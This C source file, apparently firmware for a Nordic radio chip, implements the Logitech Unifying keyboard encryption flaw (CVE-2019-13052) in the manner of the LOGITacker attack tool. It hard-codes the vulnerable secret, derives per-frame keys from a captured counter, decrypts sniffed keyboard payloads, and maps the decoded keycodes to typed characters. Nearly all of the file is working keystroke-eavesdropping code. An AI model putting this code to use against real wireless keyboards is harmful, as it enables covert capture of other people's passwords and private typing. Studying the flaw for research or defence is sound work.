/*
 * esb_unifying.c - Logitech Unifying crypto + HID keymap, on-device.
 *
 * Mirrors cli_esb.py (host, unit-verified) and mame82's LOGITacker. AES-128-ECB
 * is the SoftDevice ECB peripheral (sd_ecb_block_encrypt), standard AES with
 * the key as given (no byte reversal). The "little known secret" and the
 * counter-at-offset-7 splice are CVE-2019-13052 / LOGITacker.
 */

#include "esb_unifying.h"

#include <string.h>

#include "nrf_soc.h"       /* sd_ecb_block_encrypt, nrf_ecb_hal_data_t */

static const uint8_t SECRET[16] = {
    0x04, 0x14, 0x1d, 0x1f, 0x27, 0x28, 0x0d,
    0xde, 0xad, 0xbe, 0xef,                 /* [7..10] overwritten by the counter */
    0x0a, 0x0d, 0x13, 0x26, 0x0e,
};

static void aes128_ecb(const uint8_t key[16], const uint8_t in[16], uint8_t out[16]) {
    nrf_ecb_hal_data_t d;
    memcpy(d.key, key, 16);
    memcpy(d.cleartext, in, 16);
    if (sd_ecb_block_encrypt(&d) == NRF_SUCCESS) memcpy(out, d.ciphertext, 16);
    else                                         memset(out, 0, 16);
}

void esb_unifying_frame_key(const uint8_t device_key[16], const uint8_t counter[4],
                            uint8_t out[16]) {
    uint8_t secret[16];
    memcpy(secret, SECRET, 16);
    memcpy(&secret[7], counter, 4);
    aes128_ecb(device_key, secret, out);
}

bool esb_unifying_decrypt_keyboard(const uint8_t device_key[16],
                                   const uint8_t *payload, uint8_t len,
                                   uint8_t report_out[8]) {
    if (len != 22 || (payload[1] & 0x1f) != 0x13) return false;
    uint8_t fk[16];
    esb_unifying_frame_key(device_key, &payload[10], fk);
    for (int i = 0; i < 8; i++) report_out[i] = (uint8_t)(payload[2 + i] ^ fk[i]);
    return true;
}

char esb_unifying_keycode_char(uint8_t code, uint8_t mod) {
    bool shift = (mod & 0x22) != 0;         /* L/R shift */
    if (code >= 0x04 && code <= 0x1d)       /* a-z */
        return (char)((shift ? 'A' : 'a') + (code - 0x04));
    if (code >= 0x1e && code <= 0x27) {     /* 1-0 */
        static const char d[] = "1234567890";
        static const char s[] = "!@#$%^&*()";
        return shift ? s[code - 0x1e] : d[code - 0x1e];
    }
    switch (code) {
        case 0x2c: return ' ';
        case 0x28: return '\n';             /* enter */
        case 0x2b: return '\t';             /* tab */
        case 0x2d: return shift ? '_' : '-';
        case 0x2e: return shift ? '+' : '=';
        case 0x2f: return shift ? '{' : '[';
        case 0x30: return shift ? '}' : ']';
        case 0x31: return shift ? '|' : '\\';
        case 0x33: return shift ? ':' : ';';
        case 0x34: return shift ? '"' : '\'';
        case 0x35: return shift ? '~' : '`';
        case 0x36: return shift ? '<' : ',';
        case 0x37: return shift ? '>' : '.';
        case 0x38: return shift ? '?' : '/';
        default:   return 0;
    }
}
